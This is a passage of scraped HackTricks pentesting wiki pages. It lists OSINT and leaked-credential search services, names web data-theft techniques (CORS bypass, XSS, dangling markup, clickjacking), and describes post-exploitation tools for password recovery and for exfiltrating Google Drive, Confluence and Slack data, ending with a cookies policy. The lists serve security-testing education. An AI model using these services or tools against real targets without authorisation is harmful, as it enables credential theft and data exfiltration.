or inside a domain server, domains owned by an email (find related domains), IP history of domains (find the host behind CloudFlare), all domains using a nameserver....\nYou have some free access.\n‚Äã\nfullcontact\n‚Äã\nAllows to search by email, domain or company name and retrieve \"personal\" information related. It can also verify emails. There is some free access.\n‚Äã\nRiskIQ\n‚Äã\nA lot of information from domains and IPs even in the free/community version.\n‚Äã\n_IntelligenceX\n‚Äã\nSearch Domains, IPs and emails and get info from dumps. Have some free access.\n‚Äã\nIBM X-Force Exchange\n‚Äã\nSearch by IP and gather information related to suspicions activities. There is some free access.\n‚Äã\nGreynoise\n‚Äã\nSearch by IP or IP range and get information about IPs scanning the Internet. 15 days free access.\n‚Äã\nShodan\n‚Äã\nGet scan information of an IP address. Have some free api access.\n‚Äã\nCensys\n‚Äã\nVery similar to shodan\n‚Äã\nbuckets.grayhatwarfare.com\n‚Äã\nFind open S3 buckets searching by keyword.\n‚Äã\nDehashed\n‚Äã\nFind leaked credentials of emails and even domains\nCommercial?\n‚Äã\npsbdmp\n‚Äã\nSearch pastebins where a email appeared. Commercial?\n‚Äã\nemailrep.io\n‚Äã\nGet reputation of a mail. Commercial?\n‚Äã\nghostproject\n‚Äã\nGet passwords from leaked emails. Commercial?\n‚Äã\nBinaryedge\n‚Äã\nObtain interesting info from IPs\n‚Äã\nhaveibeenpwned\n‚Äã\nSearch by domain and email and get if it was pwned and passwords. Commercial?\n‚Äã\nhttps://dnsdumpster.com/\n(in a commercial tool?)\n‚Äã\nhttps://www.netcraft.com/\n(in a commercial tool?)\n‚Äã\nhttps://www.nmmapper.com/sys/tools/subdomainfinder/\n(in a commercial tool?)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\n1911 - Pentesting fox\nNext\n- TODO\nStealing Sensitive Information Disclosure from a Web\nLast modified\n6mo ago"
    },
    {
        "title": "Stealing Sensitive Information Disclosure from a Web",
        "url": "https://book.hacktricks.xyz/todo/stealing-sensitive-information-disclosure-from-a-web",
        "text": "Stealing Sensitive Information Disclosure from a Web\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIf at some point you find a\nweb page that presents you sensitive information based on your session\n: Maybe it's reflecting cookies, or printing or CC details or any other sensitive information, you may try to steal it.\nHere I present you the main ways to can try to achieve it:\n‚Äã\nCORS bypass\n: If you can bypass CORS headers you will be able to steal the information performing Ajax request for a malicious page.\n‚Äã\nXSS\n: If you find a XSS vulnerability on the page you may be able to abuse it to steal the information.\n‚Äã\nDanging Markup\n: If you cannot inject XSS tags you still may be able to steal the info using other regular HTML tags.\n‚Äã\nClickjaking\n: If there is no protection against this attack, you may be able to trick the user into sending you the sensitive data (an example\nhere\n).\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nOnline Platforms with API\nNext\n- TODO\nPost Exploitation\nLast modified\n6mo ago"
    },
    {
        "title": "Post Exploitation",
        "url": "https://book.hacktricks.xyz/todo/post-exploitation",
        "text": "Post Exploitation\n‚Äã\n\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nLocal l00t\n‚Äã\nPEASS-ng\n: These scripts, apart for looking for PE vectors, will look for sensitive information inside the filesystem.\n‚Äã\nLaZagne\n: The\nLaZagne project\nis an open source application used to\nretrieve lots of passwords\nstored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.\nExternal Services\n‚Äã\nConf-Thief\n: This Module will connect to Confluence's API using an access token, export to PDF, and download the Confluence documents that the target has access to.\n‚Äã\nGD-Thief\n: Red Team tool for exfiltrating files from a target's Google Drive that you(the attacker) has access to, via the Google Drive API. This includes includes all shared files, all files from shared drives, and all files from domain drives that the target has access to.\n‚Äã\nGDir-Thief\n: Red Team tool for exfiltrating the target organization's Google People Directory that you have access to, via Google's People API.\n‚Äã\nSlackPirate\n:\nThis is a tool developed in Python which uses the native Slack APIs to extract 'interesting' information from a Slack workspace given an access token.\n‚Äã\nSlackhound\n: Slackhound is a command line tool for red and blue teams to quickly perform reconnaissance of a Slack workspace/organization. Slackhound makes collection of an organization's users, files, messages, etc. quickly searchable and large objects are written to CSV for offline review.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nTODO -\nPrevious\nStealing Sensitive Information Disclosure from a Web\nNext\n- TODO\nCookies Policy\nLast modified\n6mo ago"
    },
    {
        "title": "Cookies Policy",
        "url": "https://book.hacktricks.xyz/todo/cookies-policy",
        "text": "Cookies Policy\nLast updated: 02/04/2023\nIntroduction\nThis Cookies Policy applies to the following websites owned and operated by HackTricks team (\"HackTricks\", \"we\", \"us\" or \"our\"):\nhacktricks.xyz\n‚Äã\nwww.hacktricks.xyz\n‚Äã\nbook.hacktricks.xyz\ncloud.hacktricks.xyz\nBy using any of these websites, you agree to the use of cookies in accordance with this Cookies Policy. If you do not agree, please disable cookies in your browser settings or refrain from using our websites.\nWhat are cookies?\nCookies are small text files that are stored on your computer or mobile device when you visit a website. They are widely used to make websites work, improve their functionality, and provide a more personalized user experience.\nHow we use cookies\nWe use cookies on our websites for the following purposes:\n1.\nEssential cookies: These cookies are necessary for the basic functionality of our websites, such as enabling user authentication, maintaining security, and remembering your preferences.\n2.\nPerformance cookies: These cookies help us understand how visitors interact with our websites, by collecting and reporting information anonymously. This allows us to improve our website performance and user experience.\n3.\nFunctionality cookies: These cookies enable our websites to remember choices you make, such as your language or region, to provide a more personalized experience.\n4.\nTargeting/advertising cookies: These cookies are used to deliver relevant ads and marketing communications based on your interests, browsing history, and interactions with our websites.\nMoreover, the pages book.hacktricks.xyz and cloud.hacktricks.xyz are hosted in Gitbook. You can find more information about Gitbooks cookies in\nhttps://gitbook-1652864889.teamtailor.com/cookie-policy\n.\nThird-party cookies\nIn addition to our own cookies, we may also use third-party cookies to report website usage statistics, deliver advertisements, and enable social media sharing buttons. The use of third-party cookies is subject to their respective privacy policies.\nManaging cookies\nMost web browsers allow you to manage cookies through their settings. You can choose to block, delete, or limit the use of cookies on your device. However, please note that disabling cookies may affect the functionality and performance of our websites.\nChanges to this Cookies Policy\nWe may update this Cookies Policy from time to time to reflect changes in our practices or relevant laws. We encourage you to periodically review this page for the latest information on our cookie practices.\nContact us\nIf you have any questions or concerns about this Cookies Policy, please contact us at\n[email¬†protected]\n‚Äã\nTODO -\nPrevious\nPost Exploitation\nLast modified\n7mo ago"
    }
]